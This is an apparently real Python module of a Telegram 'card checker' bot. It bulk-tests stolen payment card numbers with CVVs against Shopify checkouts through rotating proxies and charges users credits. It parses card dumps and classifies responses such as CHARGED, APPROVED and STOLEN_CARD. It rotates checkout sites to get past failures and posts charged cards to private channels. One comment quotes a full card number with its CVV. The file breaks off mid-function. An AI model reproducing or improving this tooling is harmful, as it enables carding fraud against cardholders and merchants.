import asyncio
import aiohttp
import threading as _threading
import random
import re
import logging
import time
import string
import os
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from collections import deque
from html import escape as html_escape

# Absolute path to sites.txt
SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter
from aiogram.filters.callback_data import CallbackData
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, get_collection, deduct_credits_atomic, load_global_proxies, is_unlimited_msh
from bin import get_bin_info
from sub import get_premium_status, ADMIN_IDS
from shopify_api import call_shopify_api

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ADMIN_IDS = {8502412301, 8952038376, 7814400733}

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

BTN_CHARGED_EMOJI_ID = "5465465194056525619"
BTN_DEAD_EMOJI_ID = "5042112436648281096"
BTN_LIVE_EMOJI_ID = "5039793437776282663"
BTN_STOP_EMOJI_ID = "6179444193518162239"
BTN_ALL_EMOJI_ID = "4956324463525233747"

# Premium Emoji IDs (provided by owner)
EMOJI_RED_TICK   = "6147565374289220368"
EMOJI_BLUE_TICK  = "5278628026416909103"
EMOJI_LIGHTNING  = "5219745609631674840"
EMOJI_STAR       = "5359686514697576863"
EMOJI_FIRE       = "6186076099764555777"
EMOJI_CROWN      = "6338940587193930733"
EMOJI_EPIC       = "6052994304715002242"
EMOJI_WHITE_STAR = "5247131412032670246"
EMOJI_DIAMOND    = "5465465194056525619"
EMOJI_GLOBE      = "5359686514697576863"

HIT_LOG_GROUP_ID = -1003911344323  # fallback numeric — overridden by resolver at startup
HIT_LOG_GROUP_HANDLE = "@blackulogs"
EXTRA_CHARGED_GROUP_ID = -1004402375775  # fallback — overridden by resolver at startup
EXTRA_CHARGED_GROUP_HANDLE = "@privateblack00"   # dedicated channel for all users' charged CCs

BUTTON_LOCK_SECONDS = 30

MSH_SESSIONS = {}
SESSION_LOCKS = {}

# ── Shared HTTP session for MSH API calls (avoids per-card session creation) ──
_MSH_HTTP_SESSION = None

def _get_msh_http_session():
    global _MSH_HTTP_SESSION
    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
        _MSH_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=80),
            connector=aiohttp.TCPConnector(limit=500, ssl=False)
        )
    return _MSH_HTTP_SESSION

# ── Session GC: prune stale sessions every 10 min to prevent memory leaks ─────
_MSH_SESSION_MAX_AGE = 3600

def _cleanup_msh_sessions():
    import time as _t
    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MSH_SESSIONS.items())
            if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    import time as _t
    def _loop():
        while True:
            _t.sleep(600)
            try: _cleanup_msh_sessions()
            except Exception: pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GLOBAL API LOAD-SHEDDING
# When many users run /msh concurrently, naive per-session concurrency
# multiplies into hundreds of parallel API calls → backend overloads,
# returns 429/503/timeouts, and errors cascade across all sessions.
#
# This module enforces TWO caps:
#   1. GLOBAL cap  — total concurrent API calls across ALL /msh sessions.
#                     Sized for Railway free/hobby tier (~50 graceful).
#   2. PER-USER cap — one user can't hog the entire global pool.
#
# Plus an ADAPTIVE THROTTLE that watches API health (failure rate +
# avg latency) over a rolling window and auto-slows everyone down when
# the backend struggles. Converts a thundering-herd retry storm into
# gentle backpressure so the backend can recover.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Total concurrent API calls allowed across ALL /msh sessions at once.
_GLOBAL_API_CONCURRENCY = 50

# Per-user concurrent API calls (down from 75 — one user no longer
# can hog the global pool). Combined with the global cap, the worst
# case of N users running simultaneously is capped at min(N×20, 50).
_PER_USER_API_CONCURRENCY = 20

_GLOBAL_API_SEMAPHORE = asyncio.Semaphore(_GLOBAL_API_CONCURRENCY)

# Rolling window for API health tracking (seconds)
_API_HEALTH_WINDOW_SEC = 60
# Failure rate above which we start slowing everyone down
_API_HEALTH_FAIL_THRESHOLD = 0.35
# Average response time above which we start slowing (ms)
_API_HEALTH_SLOW_THRESHOLD_MS = 25000
# Extra delay added per API call when backend is unhealthy (ms)
_API_HEALTH_BACKOFF_BASE_MS = 400
_API_HEALTH_BACKOFF_MAX_MS = 2500

# Rolling log of recent API outcomes: (monotonic_ts, success_bool, elapsed_ms)
_api_health_log: deque = deque(maxlen=300)


# Cached references to shopify_api breaker state — looked up by name on
# every call to _adaptive_api_throttle, but resolved once at module
# import so we don't re-execute `from shopify_api import ...` per call.
try:
    from shopify_api import _breaker_state as _shopify_breaker_state
    from shopify_api import _breaker_open_until as _shopify_breaker_open_until
except Exception:
    _shopify_breaker_state = None
    _shopify_breaker_open_until = None


def _record_api_outcome(success: bool, elapsed_ms: float) -> None:
    """Record one API call outcome for the global adaptive throttle."""
    _api_health_log.append((time.monotonic(), bool(success), float(elapsed_ms)))


async def _adaptive_api_throttle() -> None:
    """
    Wait a small delay before issuing an API call. Delay scales UP when
    recent API outcomes look unhealthy (high failure rate or high latency)
    so all /msh sessions collectively back off and let the backend recover.
    Always adds jitter so bursty hits don't all wake at the same instant.

    Cooperates with the global circuit breaker in shopify_api: when the
    breaker is OPEN, the breaker itself pauses everything for ≥6s, so
    we skip our extra delay to avoid stacking waits.
    """
    # If the breaker in shopify_api is already open, it will pause us
    # for several seconds — adding another delay here is wasteful.
    if _shopify_breaker_state is not None:
        try:
            if _shopify_breaker_state == "OPEN":
                remaining = _shopify_breaker_open_until - time.monotonic()
                if remaining > 0:
                    # Let the breaker do the heavy pausing
                    await asyncio.sleep(remaining + random.uniform(0, 0.2))
                    return
        except Exception:
            pass

    now = time.monotonic()
    cutoff = now - _API_HEALTH_WINDOW_SEC
    while _api_health_log and _api_health_log[0][0] < cutoff:
        _api_health_log.popleft()

    backoff_ms = 0.0
    n = len(_api_health_log)
    if n >= 20:
        fail_count = sum(1 for _, ok, _ in _api_health_log if not ok)
        fail_rate = fail_count / n
        avg_ms = sum(ms for _, _, ms in _api_health_log) / n
        if fail_rate > _API_HEALTH_FAIL_THRESHOLD or avg_ms > _API_HEALTH_SLOW_THRESHOLD_MS:
            severity_fail = max(0.0, (fail_rate - _API_HEALTH_FAIL_THRESHOLD) / (1 - _API_HEALTH_FAIL_THRESHOLD))
            severity_slow = max(0.0, (avg_ms - _API_HEALTH_SLOW_THRESHOLD_MS) / _API_HEALTH_SLOW_THRESHOLD_MS)
            severity = max(severity_fail, severity_slow)
            backoff_ms = min(
                _API_HEALTH_BACKOFF_MAX_MS,
                _API_HEALTH_BACKOFF_BASE_MS * (1 + 5 * severity),
            )
            if backoff_ms >= _API_HEALTH_BACKOFF_BASE_MS:
                logging.warning(
                    f"[API-HEALTH] unhealthy: fail_rate={fail_rate:.0%} avg_ms={avg_ms:.0f} "
                    f"→ adding {backoff_ms:.0f}ms backoff to next request"
                )

    jitter_ms = random.uniform(20, 150)
    total_ms = backoff_ms + jitter_ms
    if total_ms > 0:
        await asyncio.sleep(total_ms / 1000.0)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PER-USER DM RATE LIMITER
# Avoids Telegram "Flood control exceeded" when many hits fire to the same
# user concurrently. Tracks last send time per user_id and blocks until
# the safe interval has elapsed. Also handles TelegramRetryAfter by
# sleeping the requested amount.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Minimum gap between consecutive DM messages to the SAME user (seconds).
# Telegram allows ~1 msg/sec per chat; using 1.5s with jitter keeps us well
# under the per-chat flood limit even when 100 workers send hits at once.
_DM_MIN_GAP_SEC = 1.5

# Per-user: last successful DM send time
_DM_LAST_SEND: dict[int, float] = {}
# Per-user: lock so concurrent workers serialise their DM sends
_DM_LOCKS: dict[int, asyncio.Lock] = {}
# Global lock protecting _DM_LOCKS dict itself
_DM_LOCKS_GUARD = asyncio.Lock()


async def _get_dm_lock(user_id: int) -> asyncio.Lock:
    """Return (and lazily create) the per-user DM lock."""
    async with _DM_LOCKS_GUARD:
        lock = _DM_LOCKS.get(user_id)
        if lock is None:
            lock = asyncio.Lock()
            _DM_LOCKS[user_id] = lock
        return lock


async def _throttle_user_dm(user_id: int) -> None:
    """
    Wait until it is safe to send a DM to `user_id`.
    Two layers of protection:
      1. Per-user serialisation via lock (workers don't race the same chat)
      2. Minimum time gap between consecutive sends to the same user
    """
    lock = await _get_dm_lock(user_id)
    async with lock:
        now = time.monotonic()
        last = _DM_LAST_SEND.get(user_id, 0.0)
        wait = _DM_MIN_GAP_SEC - (now - last)
        if wait > 0:
            # Small jitter (0–150ms) so bursty hits don't all wake at the
            # exact same instant after the wait.
            jitter = random.uniform(0, 0.15)
            await asyncio.sleep(wait + jitter)
        _DM_LAST_SEND[user_id] = time.monotonic()


async def _safe_send_animation_dm(bot: Bot, user_id: int, **kwargs) -> Optional[types.Message]:
    """
    send_animation wrapper for user DMs: throttles + handles TelegramRetryAfter.
    Returns the sent Message on success, None if user blocked bot / chat missing.
    """
    await _throttle_user_dm(user_id)
    try:
        return await bot.send_animation(chat_id=user_id, **kwargs)
    except TelegramRetryAfter as e:
        retry_s = getattr(e, "retry_after", 5) or 5
        logging.info(
            f"[MSH] Telegram flood control on DM to {user_id} — "
            f"cooling down for {retry_s}s"
        )
        await asyncio.sleep(retry_s + 0.5)
        # Update last-send so the throttle respects the new floor
        _DM_LAST_SEND[user_id] = time.monotonic()
        try:
            return await bot.send_animation(chat_id=user_id, **kwargs)
        except (TelegramForbiddenError, TelegramBadRequest) as e2:
            logging.warning(f"[MSH] Could not DM after retry to user {user_id}: {e2}")
            return None
        except Exception as e2:
            logging.error(f"[MSH] Error DMing after retry to user {user_id}: {e2}")
            return None
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM user {user_id}: {e}")
        return None
    except Exception as e:
        logging.error(f"[MSH] Error DMing user {user_id}: {e}")
        return None


router = Router()

API_BASE_URL = "https://shopify-api-production-00.up.railway.app/check"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

class MshRetryCallback(CallbackData, prefix="mshx"):
    session_id: str

class MshModeCallback(CallbackData, prefix="mshm"):
    pending_id: str
    mode: str  # "charged" or "approved"


class MshForceStopCallback(CallbackData, prefix="mshf"):
    """Admin-forces-stop callback used by /sessions command."""
    session_id: str


# Holds pre-prepared card check data waiting for the user to pick a mode
# key = pending_id (random 10-char), value = dict with message/cards/proxies/etc.
MSH_PENDING: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    """
    Proxy Manager - Only fails on REAL proxy errors.

    Key Features:
    - Does NOT fail on 429 rate limits (normal Shopify behavior)
    - Does NOT fail on card responses (DECLINED, APPROVED, 3DS, etc.)
    - Does NOT fail on Step 0-10 errors (retryable with new site)
    - ONLY fails on: connection timeouts, DNS errors, auth failures
    - Ensures proper http://user:pass@host:port format
    """

    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
    ]

    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway'
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id = session_id
        self.raw_proxies = list(set(proxies_list))

        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]

        self.proxy_queue = deque(self.all_proxies)
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses = 0
        self.cooldown_seconds = 60

        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}")

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None

        proxy = proxy.strip()

        if proxy.startswith(('http://', 'https://')):
            return proxy
        if proxy.startswith('socks5://'):
            return 'http://' + proxy[9:]

        if '@' in proxy and ':' in proxy.split('@')[0]:
            return f'http://{proxy}'

        parts = proxy.split()
        if len(parts) == 4:
            user, pwd, host, port = parts
            return f'http://{user}:{pwd}@{host}:{port}'

        if ':' in proxy and '@' not in proxy:
            parts = proxy.split(':')
            if len(parts) == 2 and parts[1].isdigit():
                return f'http://{proxy}'
            if len(parts) == 4:
                host, port, user, password = parts
                return f'http://{user}:{password}@{host}:{port}'

        return f'http://{proxy}'

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False

        current_time = time.time()
        attempts = 0
        max_attempts = len(self.all_proxies) * 2

        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)

            proxy = self.proxy_queue.popleft()

            if proxy in self.failed_proxies:
                fail_data = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)

                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]

            self.proxy_queue.append(proxy)
            self.total_uses += 1

            return proxy, True

        if self.failed_proxies:
            best_proxy = min(
                self.failed_proxies.keys(),
                key=lambda p: self.failed_proxies[p].get('cooldown_until', float('inf'))
            )
            logging.warning(f"[ProxyManager] All proxies in cooldown, forcing {mask_proxy(best_proxy)}")
            self.total_uses += 1
            return best_proxy, True

        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        else:
            self.success_counts[proxy] = 1

        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''

        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False

        if '429' in response_lower or 'too many requests' in response_lower:
            return False

        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False

        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False

        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False

        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False

        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True

        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()

        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {
                    'fail_count': 0,
                    'first_fail': current_time,
                    'last_fail': current_time,
                    'cooldown_until': 0
                }

            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail'] = current_time

            fail_count = fail_data['fail_count']
            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
            multiplier_index = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration = cooldown_multipliers[multiplier_index]

            fail_data['cooldown_until'] = current_time + cooldown_duration

            logging.warning(
                f"[ProxyManager] Proxy FAILED (real error): {mask_proxy(proxy)} "
                f"(#{fail_count}) Cooldown: {cooldown_duration}s | Response: {api_response[:80]}"
            )
        else:
            self.report_success(proxy)
            logging.debug(
                f"[ProxyManager] Proxy OK: {mask_proxy(proxy)} | "
                f"Response: {api_response[:60]}"
            )

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        failed_count = len(self.failed_proxies)

        return {
            'total_proxies': len(self.all_proxies),
            'active': active_count,
            'failed': failed_count,
            'total_uses': self.total_uses,
            'success_distribution': dict(self.success_counts)
        }

    def get_available_count(self) -> int:
        current_time = time.time()
        available = 0
        for proxy in self.all_proxies:
            if proxy in self.failed_proxies:
                if current_time >= self.failed_proxies[proxy].get('cooldown_until', 0):
                    available += 1
            else:
                available += 1
        return available


def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                addr = parts[1]
                return f"***@{addr}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except:
        return "***"

def build_user_link(user_obj) -> str:
    """
    Returns a properly clickable HTML hyperlink for the user.
    Uses https://t.me/username when username is available (works in all groups).
    Falls back to tg://user?id= for users without a username.
    Name is HTML-escaped to prevent Telegram parse errors with special characters.
    """
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})$',
        r'^(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})$',
        r'^(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})$',
        r'^(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})$',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]

    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 5 and pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                cc, mm, yy, cvv = groups[1], groups[2], groups[3], groups[4]
            elif len(groups) == 4:
                cc, mm, yy, cvv = groups
            else:
                continue
            month = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, month, yy, cvv
    return None

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def log_hit_to_mshh(user_id, username, first_name):
    try:
        with open("mshh.txt", "a", encoding="utf-8") as f:
            u_name = username if username else "None"
            f_name = first_name if first_name else "Unknown"
            f.write(f"{user_id}|{u_name}|{f_name}\n")
    except Exception as e:
        logging.error(f"Error writing to mshh.txt: {e}")

# ══════════════════════════════════════════
# RETRY ERRORS - Site/Step Issues (Retry with NEW SITE)
# ══════════════════════════════════════════
# These messages mean the site/checkout itself failed — NOT the
# card, NOT the proxy. We rotate to a different site and try again.
#
# IMPORTANT: keep these patterns SPECIFIC to checkout/site failures.
# A bare substring like "error" is NOT in this list because it would
# over-match unrelated messages. Site-error patterns should mention
# checkout / site / payment / token / etc.
RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'could not resolve host', 'connect tunnel failed',
    'timeout', 'proxy error',

    # Site / checkout errors — NOT a real card decline. Try another site.
    # Caught the user-reported card 4240090003774430|06|29|553 which used
    # to be short-circuited to "ERROR" status with zero retries.
    'an error occurred during the checkout',
    'an error occurred during checkout',
    'error occurred during the checkout',
    'error occurred during checkout',
    'error during checkout',
    'checkout error',
    'checkout failed',
    'checkout process',
    'payment processing error',
    'payment error',
    'unable to process payment',
    'unable to complete checkout',
    'unable to complete the checkout',
    'unable to complete the order',
    'unable to place order',
    'internal checkout error',
    'internal server error',
    'store error',
    'shop error',
    'merchant error',
    'gateway error',
    'processing error',
    'transaction error',
    'order error',
    'cart error',

    'step 0 failed',
    'step 1 failed',
    'step 2 failed',
    'step 3 failed',
    'step 4 failed',
    'step 5 failed',
    'step 6 failed',
    'step 7 failed',
    'step 8 failed',
    'step 9 failed',
    'step 10 failed',

    'no available products found',
    'could not extract receiptid',
    'could not extract signedhandles',
    'receiptid missing',
    'response missing receiptid',
    'products.json',
    'returned status 429',
    'returned status 500',
    'returned status 502',
    'returned status 503',
    'returned status 504',
    'store incompatible',
    'extract signedHandles',
    'missing receiptId',
]

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ANIME GIF LRU CACHE
# Previously get_anime_gif() made an external HTTP call to
# api.otakugifs.xyz for EVERY approved/charged hit. With 15 concurrent
# users and many hits, that became its own bottleneck (external latency,
# rate limits, occasional 5xx). Now we cache the last GIF URLs and reuse
# them across hits (random pick from the cache). Misses still fetch
# fresh URLs in the background to grow the pool.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_ANIME_GIF_CACHE: list = []
_ANIME_GIF_CACHE_MAX = 12
_ANIME_GIF_CACHE_LAST_FILL_MONO: float = 0.0
_ANIME_GIF_FALLBACK_URL = (
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/"
    "LdOyjZ7h5xS3yCjQ8I/giphy.gif"
)
_ANIME_GIF_CACHE_TTL_S = 1800.0  # refill the cache every 30 minutes


async def _refill_anime_gif_cache() -> None:
    """Fetch a batch of fresh anime GIF URLs in parallel (best-effort)."""
    global _ANIME_GIF_CACHE_LAST_FILL_MONO
    if not REACTIONS:
        return
    picks = random.sample(REACTIONS, k=min(6, len(REACTIONS)))
    fetched: list = []

    async def _fetch_one(reaction: str) -> Optional[str]:
        url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
        try:
            sess = await _get_msh_http_session()
            async with sess.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    u = data.get("url")
                    return u if isinstance(u, str) and u else None
        except Exception as e:
            logging.debug(f"[gif-cache] fetch failed for {reaction}: {e}")
        return None

    try:
        results = await asyncio.gather(*[_fetch_one(r) for r in picks])
        for u in results:
            if u and u not in fetched and u not in _ANIME_GIF_CACHE:
                fetched.append(u)
    except Exception as e:
        logging.debug(f"[gif-cache] refill error: {e}")

    if fetched:
        for u in fetched:
            if len(_ANIME_GIF_CACHE) >= _ANIME_GIF_CACHE_MAX:
                _ANIME_GIF_CACHE.pop(0)
            _ANIME_GIF_CACHE.append(u)
        _ANIME_GIF_CACHE_LAST_FILL_MONO = time.monotonic()
        logging.debug(f"[gif-cache] added {len(fetched)} new URLs (pool={len(_ANIME_GIF_CACHE)})")


async def get_anime_gif():
    """
    Returns a usable anime GIF URL. Uses the in-memory LRU cache so we
    don't hit api.otakugifs.xyz on every hit (15 users × many hits would
    otherwise hammer the upstream). Cache refills lazily every 30 minutes.
    """
    now = time.monotonic()
    cache_stale = (
        not _ANIME_GIF_CACHE
        or (now - _ANIME_GIF_CACHE_LAST_FILL_MONO) > _ANIME_GIF_CACHE_TTL_S
    )
    if cache_stale:
        # Fire-and-forget refill; if it fails we still serve from cache
        # (or the hardcoded fallback) on this call.
        asyncio.create_task(_refill_anime_gif_cache())

    if _ANIME_GIF_CACHE:
        return random.choice(_ANIME_GIF_CACHE)
    return _ANIME_GIF_FALLBACK_URL

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session: return False
    elapsed = time.time() - session.get('start_time', 0)
